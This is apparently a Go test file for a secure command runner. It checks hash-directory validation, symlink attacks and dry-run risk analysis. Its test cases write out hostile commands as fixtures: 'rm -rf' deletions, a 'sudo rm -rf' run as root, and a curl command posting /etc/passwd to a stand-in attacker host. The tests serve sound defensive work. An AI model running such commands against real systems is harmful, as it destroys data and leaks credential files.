package main

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/isseis/go-safe-cmd-runner/internal/filevalidator"
	executortesting "github.com/isseis/go-safe-cmd-runner/internal/runner/executor/testing"
	privilegetesting "github.com/isseis/go-safe-cmd-runner/internal/runner/privilege/testing"
	"github.com/isseis/go-safe-cmd-runner/internal/runner/resource"
	"github.com/isseis/go-safe-cmd-runner/internal/runner/runnertypes"
	"github.com/stretchr/testify/mock"
)

// MockPathResolver is defined locally as it's specific to resource management
type MockPathResolver struct {
	mock.Mock
}

func (m *MockPathResolver) ResolvePath(command string) (string, error) {
	args := m.Called(command)
	return args.String(0), args.Error(1)
}

// validateMaliciousConfig validates that a malicious config file contains
// expected dangerous patterns and target paths for security testing purposes.
func validateMaliciousConfig(t *testing.T, configPath string, expectedPatterns []string, targetPath string) {
	t.Helper()

	// Verify that the malicious config file contains dangerous commands
	// This validates that our test setup correctly creates a security risk scenario
	configContent, err := os.ReadFile(configPath)
	if err != nil {
		t.Errorf("Failed to read malicious config: %v", err)
		return
	}

	configStr := string(configContent)

	// Verify the config contains all expected dangerous patterns
	for _, pattern := range expectedPatterns {
		if !strings.Contains(configStr, pattern) {
			t.Errorf("Malicious config should contain dangerous pattern %q", pattern)
		}
	}

	// Verify the target path if specified
	if targetPath != "" && !strings.Contains(configStr, targetPath) {
		t.Errorf("Malicious config should target test-specific path %q", targetPath)
	}

	t.Log("Malicious config properly contains dangerous command - would require dry-run or security controls for safe execution")
}

// TestSecureExecutionFlow tests the complete secure execution flow
func TestSecureExecutionFlow(t *testing.T) {
	testCases := []struct {
		name          string
		setupFunc     func(t *testing.T) string
		hashDirectory string
		expectError   bool
		errorContains string
	}{
		{
			name: "successful_execution_with_valid_config_and_hash_dir",
			// Only create the temporary directory; config file was unused by the test
			setupFunc: func(t *testing.T) string {
				return t.TempDir()
			},
			expectError: false,
		},
		{
			name: "failure_with_invalid_hash_directory",
			setupFunc: func(t *testing.T) string {
				return t.TempDir()
			},
			hashDirectory: "/nonexistent/hash/directory",
			expectError:   true,
			errorContains: "hash directory not found",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			tempDir := tc.setupFunc(t)

			var hashDir string
			if tc.hashDirectory != "" {
				hashDir = tc.hashDirectory
			} else {
				hashDir = filepath.Join(tempDir, "hashes")
				if !tc.expectError {
					if err := os.MkdirAll(hashDir, 0o700); err != nil {
						t.Fatalf("Failed to create hash directory: %v", err)
					}
				}
			}

			// Hash directory validation is now performed internally by verification.Manager
			// We just need to ensure the directory exists for the test
			if _, err := os.Stat(hashDir); err != nil && !tc.expectError {
				t.Errorf("Hash directory should exist: %v", err)
			}
		})
	}
}

// TestVerificationIntegration tests the integration of multiple verification steps
func TestVerificationIntegration(t *testing.T) {
	testCases := []struct {
		name          string
		setupFunc     func(t *testing.T) (hashDir string, configPath string)
		expectError   bool
		errorContains string
	}{
		{
			name: "successful_multi_step_verification",
			setupFunc: func(t *testing.T) (string, string) {
				tempDir := t.TempDir()
				hashDir := filepath.Join(tempDir, "hashes")
				if err := os.MkdirAll(hashDir, 0o700); err != nil {
					t.Fatalf("Failed to create hash directory: %v", err)
				}

				configPath := filepath.Join(tempDir, "config.toml")
				configContent := `
[global]
log_level = "debug"
verify_standard_paths = false

[[groups]]
name = "integration-test"

[[groups.commands]]
name = "test-cmd"
cmd = ["echo", "integration-test"]
`
				if err := os.WriteFile(configPath, []byte(configContent), 0o644); err != nil {
					t.Fatalf("Failed to create config file: %v", err)
				}
				return hashDir, configPath
			},
			expectError: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			hashDir, configPath := tc.setupFunc(t)

			// Hash directory validation is now performed internally by verification.Manager
			// Step 1: Verify hash directory exists
			if _, err := os.Stat(hashDir); err != nil && !tc.expectError {
				t.Errorf("Hash directory should exist: %v", err)
			}

			// If we expected an error, return early as the test is complete
			if tc.expectError {
				return
			}

			// Step 2: Verify config file exists and is readable
			if _, err := os.Stat(configPath); err != nil {
				t.Errorf("Config file verification failed: %v", err)
			}
		})
	}
}

// TestSecurityAttackScenarios tests various security attack scenarios
func TestSecurityAttackScenarios(t *testing.T) {
	testCases := []struct {
		name             string
		setupFunc        func(t *testing.T) (hashDir string, configPath string)
		expectError      bool
		errorContains    string
		validateConfig   bool
		expectedPatterns []string
		targetPath       string
	}{
		{
			name: "symlink_attack_on_hash_directory",
			setupFunc: func(t *testing.T) (string, string) {
				tempDir := t.TempDir()

				targetDir := filepath.Join(os.TempDir(), "symlink_target")
				if err := os.MkdirAll(targetDir, 0o755); err != nil {
					t.Fatalf("Failed to create target directory: %v", err)
				}
				t.Cleanup(func() { os.RemoveAll(targetDir) })

				symlinkPath := filepath.Join(tempDir, "hashes")
				if err := os.Symlink(targetDir, symlinkPath); err != nil {
					t.Fatalf("Failed to create symlink: %v", err)
				}

				configPath := filepath.Join(tempDir, "config.toml")
				configContent := `
[global]
log_level = "info"
`
				if err := os.WriteFile(configPath, []byte(configContent), 0o644); err != nil {
					t.Fatalf("Failed to create config file: %v", err)
				}

				return symlinkPath, configPath
			},
			expectError:   true,
			errorContains: "symlink",
		},
		{
			name: "malicious_config_file_content",
			setupFunc: func(t *testing.T) (string, string) {
				tempDir := t.TempDir()

				hashDir := filepath.Join(tempDir, "hashes")
				if err := os.MkdirAll(hashDir, 0o700); err != nil {
					t.Fatalf("Failed to create hash directory: %v", err)
				}

				configPath := filepath.Join(tempDir, "malicious_config.toml")
				maliciousContent := `
[global]
log_level = "info"

[[groups]]
name = "malicious-group"

[[groups.commands]]
name = "dangerous-cmd"
cmd = ["rm", "-rf", "/tmp/should-not-execute"]
`
				if err := os.WriteFile(configPath, []byte(maliciousContent), 0o644); err != nil {
					t.Fatalf("Failed to create malicious config file: %v", err)
				}

				return hashDir, configPath
			},
			expectError:      false, // Config loading should succeed - actual command execution control tested in TestMaliciousConfigCommandControlSecurity
			validateConfig:   true,
			expectedPatterns: []string{"rm", "-rf"},
			targetPath:       "/tmp/should-not-execute",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			hashDir, configPath := tc.setupFunc(t)

			// Hash directory validation is now performed internally by verification.Manager
			// Verify hash directory exists
			if _, err := os.Stat(hashDir); err != nil && !tc.expectError {
				t.Errorf("Hash directory should exist: %v", err)
			}

			// For expected error cases, we've completed validation
			if tc.expectError {
				return
			}

			// Verify config file is readable
			if _, statErr := os.Stat(configPath); statErr != nil {
				t.Errorf("Config file should be readable: %v", statErr)
				// Continue to next validation - don't return early
			}

			// Perform additional security validation if required (independent of previous validations)
			if tc.validateConfig {
				validateMaliciousConfig(t, configPath, tc.expectedPatterns, tc.targetPath)
			}
		})
	}
}

// TestMaliciousConfigCommandControlSecurity verifies that dangerous commands
// are properly analyzed and controlled by the DryRunResourceManager
func TestMaliciousConfigCommandControlSecurity(t *testing.T) {
	testCases := []struct {
		name                    string
		cmd                     *runnertypes.RuntimeCommand
		group                   *runnertypes.GroupSpec
		expectedSecurityRisk    string
		expectedExecutionResult bool
		description             string
	}{
		{
			name: "dangerous_rm_command_dry_run_protection",
			cmd: &runnertypes.RuntimeCommand{
				Spec: &runnertypes.CommandSpec{
					Name: "dangerous-rm",
					Cmd:  "rm",
					Args: []string{"-rf", "/tmp/should-not-execute-in-test"},
				},
				ExpandedCmd:  "rm",
				ExpandedArgs: []string{"-rf", "/tmp/should-not-execute-in-test"},
			},
			group: &runnertypes.GroupSpec{
				Name: "malicious-group",
			},
			expectedSecurityRisk:    "high",
			expectedExecutionResult: true, // Should complete analysis without actual execution
			description:             "Dangerous rm command should be analyzed and controlled in dry-run mode",
		},
		{
			name: "sudo_privilege_escalation_protection",
			cmd: &runnertypes.RuntimeCommand{
				Spec: &runnertypes.CommandSpec{
					Name:      "sudo-escalation",
					Cmd:       "sudo",
					Args:      []string{"rm", "-rf", "/tmp/test-sudo-target"},
					RunAsUser: "root",
				},
				ExpandedCmd:  "sudo",
				ExpandedArgs: []string{"rm", "-rf", "/tmp/test-sudo-target"},
			},
			group: &runnertypes.GroupSpec{
				Name: "privilege-escalation-group",
			},
			expectedSecurityRisk:    "high",
			expectedExecutionResult: true, // Should complete analysis without actual execution
			description:             "Sudo privilege escalation should be analyzed and controlled in dry-run mode",
		},
		{
			name: "network_exfiltration_command_protection",
			cmd: &runnertypes.RuntimeCommand{
				Spec: &runnertypes.CommandSpec{
					Name: "data-exfil",
					Cmd:  "curl",
					Args: []string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
				},
				ExpandedCmd:  "curl",
				ExpandedArgs: []string{"-X", "POST", "-d", "@/etc/passwd", "https://malicious.example.com/steal"},
			},
			group: &runnertypes.GroupSpec{
				Name: "network-exfil-group",
			},
			expectedSecurityRisk:    "medium", // curl typically classified as medium risk
			expectedExecutionResult: true,     // Should complete analysis without actual execution
			description:             "Network data exfiltration should be analyzed and controlled in dry-run mode",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// RuntimeCommand doesn't need PrepareCommand

			// Import required packages for mocks
			// Note: Using the same mock setup pattern as existing tests
			tempDir := t.TempDir()
			hashDir := filepath.Join(tempDir, "hashes")
			if err := os.MkdirAll(hashDir, 0o700); err != nil {
				t.Fatalf("Failed to create hash directory: %v", err)
			}

			// Create DryRunResourceManager with mocks
			mockExec := executortesting.NewMockExecutor()
			mockPriv := privilegetesting.NewMockPrivilegeManager(true)
			mockPathResolver := &MockPathResolver{}

			// Setup command path resolution
			mockPathResolver.On("ResolvePath", tc.cmd.ExpandedCmd).Return("/usr/bin/"+tc.cmd.ExpandedCmd, nil)

			opts := &resource.DryRunOptions{
				DetailLevel:         resource.DetailLevelDetailed,
				HashDir:             hashDir,
				VerifyStandardPaths: false,
			}

			dryRunManager, err := resource.NewDryRunResourceManager(mockExec, mockPriv, mockPathResolver, opts)
			if err != nil {
				t.Fatalf("Failed to create DryRunResourceManager: %v", err)
			}

			// Execute the dangerous command in dry-run mode
			ctx := context.Background()
			env := map[string]string{}

			result, err := dryRunManager.ExecuteCommand(ctx, tc.cmd, tc.group, env)

			// Verify that execution completed successfully (analysis without actual execution)
			if tc.expectedExecutionResult {
				if err != nil {
					t.Errorf("Expected dry-run execution to succeed, but got error: %v", err)
				}
				if result == nil {
					t.Error("Expected execution result, but got nil")
				}
			} else if err == nil {
				t.Error("Expected dry-run execution to fail, but it succeeded")
			}

			// Get dry-run results to verify security analysis
			dryRunResult := dryRunManager.GetDryRunResults()
			if dryRunResult == nil {
				t.Fatal("Expected dry-run results, but got nil")
			}

			// Verify security analysis was performed
			if len(dryRunResult.ResourceAnalyses) == 0 {
				t.Error("Expected security analysis to be recorded, but no analyses found")
			}

			// Verify security risk level for the dangerous command
			found := false
			for _, analysis := range dryRunResult.ResourceAnalyses {
				// Check if this analysis is for our command (match by target path or command name)
				if strings.Contains(analysis.Target, tc.cmd.ExpandedCmd) || strings.Contains(analysis.Target, tc.cmd.Name()) {
					found = true
					if analysis.Impact.SecurityRisk != tc.expectedSecurityRisk {
						t.Errorf("Expected security risk %q, but got %q",
							tc.expectedSecurityRisk, analysis.Impact.SecurityRisk)
					}

					// Verify that security warnings are present
					if !strings.Contains(analysis.Impact.Description, "WARNING") {
						t.Error("Expected security warning in impact description")
					}

					t.Logf("Security analysis completed: %s - Risk: %s, Target: %s",
						tc.description, analysis.Impact.SecurityRisk, analysis.Target)
					break
				}
			}
			if !found {
				t.Errorf("Expected to find analysis for command %q, but it was not recorded", tc.cmd.Name())
				// Log available analyses for debugging
				for i, analysis := range dryRunResult.ResourceAnalyses {
					t.Logf("Analysis %d: Type=%s, Target=%s, SecurityRisk=%s",
						i, analysis.Type, analysis.Target, analysis.Impact.SecurityRisk)
				}
			}
			// Verify that no actual command was executed (mocks should not have been called for execution)
			// This is implicitly verified by not setting up execution expectations on mockExec

			t.Logf("Dry-run protection verified: %s", tc.description)
		})
	}
}

// TestSecurityBoundaryValidation tests security boundary validation
func TestSecurityBoundaryValidation(t *testing.T) {
	testCases := []struct {
		name          string
		setupFunc     func(t *testing.T) string
		expectError   bool
		errorContains string
	}{
		{
			name: "successful_validation_with_existing_directory",
			setupFunc: func(t *testing.T) string {
				tempDir := t.TempDir()
				hashDir := filepath.Join(tempDir, "hashes")
				if err := os.MkdirAll(hashDir, 0o700); err != nil {
					t.Fatalf("Failed to create hash directory: %v", err)
				}
				return hashDir
			},
			expectError: false,
		},
		{
			name: "relative_path_rejection",
			setupFunc: func(_ *testing.T) string {
				return "relative/path/hashes"
			},
			expectError:   true,
			errorContains: "hash directory must be absolute path",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			hashDir := tc.setupFunc(t)

			// Hash directory validation is now performed internally by verification.Manager
			// Just verify the directory exists if no error is expected
			if !tc.expectError {
				if _, err := os.Stat(hashDir); err != nil {
					t.Errorf("Hash directory should exist: %v", err)
				}
			}
		})
	}
}

// TestUnverifiedDataAccessPrevention tests that access to unverified data is properly prevented
func TestUnverifiedDataAccessPrevention(t *testing.T) {
	tempDir := t.TempDir()

	// Create hash directory
	hashDir := filepath.Join(tempDir, "hashes")
	if err := os.MkdirAll(hashDir, 0o700); err != nil {
		t.Fatalf("Failed to create hash directory: %v", err)
	}

	// Create a data file that has no corresponding hash file (unverified data)
	unverifiedFile := filepath.Join(tempDir, "unverified_data.txt")
	if err := os.WriteFile(unverifiedFile, []byte("sensitive unverified data"), 0o644); err != nil {
		t.Fatalf("Failed to create unverified data file: %v", err)
	}

	// Attempt to verify the unverified file - this should fail
	validator, err := filevalidator.New(&filevalidator.SHA256{}, hashDir)
	if err != nil {
		t.Fatalf("Failed to create validator: %v", err)
	}

	// Test that verification of unverified data fails appropriately
	err = validator.Verify(unverifiedFile)
	if err == nil {
		t.Error("Expected verification to fail for unverified data, but it succeeded")
		return
	}

	// Verify that the error is the expected hash file not found error
	if !errors.Is(err, filevalidator.ErrHashFileNotFound) {
		t.Errorf("Expected ErrHashFileNotFound, but got: %v", err)
	}

	t.Log("Successfully prevented access to unverified data - hash verification properly failed")
}
